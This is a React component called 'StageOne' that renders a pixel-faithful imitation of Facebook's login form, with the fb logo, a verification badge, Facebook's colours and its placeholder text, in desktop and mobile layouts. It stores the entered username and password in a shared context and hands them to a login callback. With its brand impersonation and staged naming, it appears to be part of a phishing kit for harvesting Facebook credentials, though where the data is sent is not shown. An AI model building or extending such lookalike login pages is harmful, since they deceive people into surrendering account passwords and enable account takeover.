import { Box, Image, Input, Stack, HStack, VStack } from "@chakra-ui/react";
import React from "react";
import { Button } from "../ui/button";
import { useUser } from "../../contexts/UserContext";

const StageOne = ({ handleLogin }) => {
  const { credentials, setCredentials, isLoading } = useUser();

  return (
    <>
      <VStack
        display={{ md: "flex", base: "none" }}
        w="100%"
        px="16px"
        gap="3rem"
      >
        <HStack alignItems="flex-start" gap="0">
          <Image src="/images/fb.svg" alt="logo" w="200px" />
          <Image
            src="/images/icons8-instagram-verification-badge-100.svg"
            alt="logo"
            w="20px"
          />
        </HStack>
        <VStack w="100%" gap="1rem">
          <Input
            type="text"
            placeholder="Email address or phone number"
            borderRadius="6px"
            fontSize="17px"
            p="14px 16px"
            border="1px solid #dddfe2"
            color="#1d2129"
            lineHeight="16px"
            h="51px"
            value={credentials.username}
            onChange={(e) =>
              setCredentials((prev) => ({
                ...prev,
                username: e.target.value,
              }))
            }
          />
          <Input
            type="password"
            placeholder="Password"
            borderRadius="6px"
            fontSize="17px"
            p="14px 16px"
            border="1px solid #dddfe2"
            color="#1d2129"
            lineHeight="16px"
            h="51px"
            value={credentials.password}
            onChange={(e) =>
              setCredentials((prev) => ({
                ...prev,
                password: e.target.value,
              }))
            }
          />
        </VStack>

        <Button
          w="100%"
          h="48px"
          bg="#1877f2"
          borderRadius="6px"
          border="0px solid #365899"
          fontSize="20px"
          fontWeight="600"
          lineHeight="48px"
          p="0 16px"
          transition="200ms cubic-bezier(.08,.52,.52,1) background-color, 200ms cubic-bezier(.08,.52,.52,1) box-shadow, 200ms cubic-bezier(.08,.52,.52,1) transform"
          onClick={handleLogin}
          disabled={isLoading || !credentials.username || !credentials.password}
        >
          Log in
        </Button>
      </VStack>

      <VStack display={{ md: "none", base: "flex" }} w="100%">
        <Image src="./images/fb.png" alt="fb" mt="7.5rem" w="60px" h="60px" />

        <VStack w="100%" mt="8rem" gap="0.8rem">
          <Input
            type="text"
            placeholder="Mobile number or email address"
            border="1px solid rgb(203, 210, 217)"
            borderRadius="12px"
            outline="none"
            outlineOffset="-1px"
            display="flex"
            flex="0 1 auto"
            cursor="pointer"
            bg="rgb(255, 255, 255)"
            p="10px 16px"
            fontSize="16.5px"
            fontWeight="600"
            h="61px"
            textOverflow="ellipsis"
            overflow="hidden"
            transformOrigin="left"
            transition="transform ease-out .1s"
            whiteSpace="nowrap"
            value={credentials.username}
            onChange={(e) =>
              setCredentials((prev) => ({
                ...prev,
                username: e.target.value,
              }))
            }
          />
          <Input
            type="password"
            placeholder="Password"
            border="1px solid rgb(203, 210, 217)"
            borderRadius="12px"
            outline="none"
            outlineOffset="-1px"
            display="flex"
            flex="0 1 auto"
            cursor="pointer"
            bg="rgb(255, 255, 255)"
            p="10px 16px"
            fontSize="16.5px"
            fontWeight="600"
            h="61px"
            textOverflow="ellipsis"
            overflow="hidden"
            transformOrigin="left"
            transition="transform ease-out .1s"
            whiteSpace="nowrap"
            value={credentials.password}
            onChange={(e) =>
              setCredentials((prev) => ({
                ...prev,
                password: e.target.value,
              }))
            }
          />

          <Button
            w="100%"
            h="44px"
            bg="rgb(0, 100, 224)"
            borderRadius="22px"
            border="0px solid rgb(28, 43, 51)"
            fontSize="16px"
            fontWeight="500"
            onClick={handleLogin}
            disabled={
              isLoading || !credentials.username || !credentials.password
            }
          >
            Log in
          </Button>
        </VStack>
      </VStack>
    </>
  );
};

export default StageOne;
